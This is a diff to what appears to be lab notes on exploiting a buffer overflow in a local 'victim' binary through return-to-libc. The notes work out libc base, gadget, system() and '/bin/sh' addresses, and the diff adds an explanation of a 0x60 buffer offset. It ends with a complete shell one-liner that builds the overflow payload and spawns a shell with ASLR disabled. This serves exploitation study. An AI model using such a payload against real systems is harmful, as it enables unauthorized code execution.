@@ -441,7 +441,7 @@
         7ffff7dcf000-7ffff7dd3000 r--p 001b2000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
         7ffff7dd3000-7ffff7dd5000 rw-p 001b6000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
         ```
-        -we see that libc is loaded into memory starting at 0x7ffff7a1d000.
+        - we see that libc is loaded into memory starting at 0x7ffff7a1d000.
             - from the previous section, we found the first part.
                 1. libcs address + 0x22a12
                     - 0x7ffff7a1d000 + 0x22a12.
@@ -524,7 +524,10 @@
         - system: 0x7ffff7a1d000 + 0x44320
         - gadgets: 0x7ffff7a1d000 + 0x22a12
         - bash: 0x7fffffffe5e0 + 64d + 8d + 24d = 0x7fffffffe640
-            - note that this is adding 60 to the buffer
+            - note that this is adding 0x60 to the buffer since it equals 96d
+                - 64 is from the 72 of the 144 0s
+                - 8 is from the 72-64 of the 144 0s
+                - 24 is from the 3*8, the address lengths of system(), "/bin/sh", and gadget. 
     - Now exploit replacing the gadget, bash, and system addresses
         ```bash
         vagrant@precise64:~$ (((printf %0144d 0; printf %016x $((0x7ffff7a1d000 + 0x22a12)) | tac -rs..; printf %016x 0x7FFFFFFFE640 | tac -rs..; printf %016x $((0x7ffff7a1d000 + 0x44320)) | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | setarch `arch` -R ./victim
